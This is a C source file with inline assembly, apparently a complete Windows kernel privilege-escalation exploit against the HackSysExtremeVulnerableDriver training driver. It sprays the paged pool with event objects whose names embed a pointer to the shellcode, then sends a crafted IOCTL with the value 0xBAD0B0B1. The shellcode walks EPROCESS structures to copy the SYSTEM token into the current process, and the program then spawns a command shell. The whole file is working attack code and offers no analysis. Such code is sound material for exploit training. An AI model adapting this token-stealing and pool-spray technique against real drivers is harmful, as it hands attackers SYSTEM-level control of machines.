#include<Windows.h>
#include<stdio.h>

#define IOCTL_OPCODE 0x222033

__declspec(naked) void ShellCode(){
    __asm{
        pushad ;save
        xor eax, eax

        mov eax, fs:[eax + 0x124]
        mov eax, [eax + 0x40]
        mov eax, [eax + 0x10] ;current process
        mov ecx, eax

        SearchSystemPid:
            mov eax, [eax + 0xb8]
            sub eax, 0xb8
            cmp [eax + 0xb4], 0x4
            jne SearchSystemPid
        
            mov eax, [eax + 0xf8]
            mov [ecx + 0xf8], eax

            popad
            ret


    }
}

HANDLE Get_Device_Handle(LPCTSTR lpFileName)
{

    HANDLE hDevice = CreateFileW(lpFileName,
         GENERIC_READ | GENERIC_WRITE,
         FILE_SHARE_READ | FILE_SHARE_WRITE, 
         NULL, 
         OPEN_EXISTING, 
         0, 
         NULL);
    if(hDevice == INVALID_HANDLE_VALUE){
        printf("[-] Failed to get device handle. Error code: %d\n", GetLastError());
        return -1;
    }
    printf("[+] Successfully got device handle[%d].\n", hDevice);
    return hDevice;
}

static VOID CreateCmd()
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

HANDLE PagedPoolObject[256];
int main(){

    HANDLE hDevice = Get_Device_Handle(L"\\\\.\\HackSysExtremeVulnerableDriver");

    DWORD bytesReturned = 0;
    char input_buffer[0x4] = {'0'};
    char output_buffer[0x80] = {'0'};

    // char *lpName = (char *)malloc(0xf0)

    char lpName[0xf0] = {'0'};
    memset(lpName, 'A', 0xf0);

    for(int i = 0; i < 256; i++){
        *(DWORD*)(lpName + 0x4) = (DWORD)(&ShellCode);
        *(DWORD*)(lpName + 0xf0 - 1) = i;
        PagedPoolObject[i] = CreateEventW(NULL, FALSE, FALSE, (LPCWSTR)lpName);
    }

    for(int i = 0; i < 256; i++){
        CloseHandle(PagedPoolObject[i]);
    }

    *(DWORD*)(input_buffer) = (DWORD)0xBAD0B0B1;
    BOOL result = DeviceIoControl(hDevice, IOCTL_OPCODE, input_buffer, (DWORD)sizeof(input_buffer), output_buffer, (DWORD)sizeof(output_buffer), &bytesReturned, NULL);

    if (result) {
    printf("[+] IOCTL request sent successfully. Bytes returned: %d\n", bytesReturned);
    }
    else {
    printf("[-] Failed to send IOCTL request. Error code: %d\n", GetLastError());
    }

    CreateCmd();

    CloseHandle(hDevice);
    return 0;
}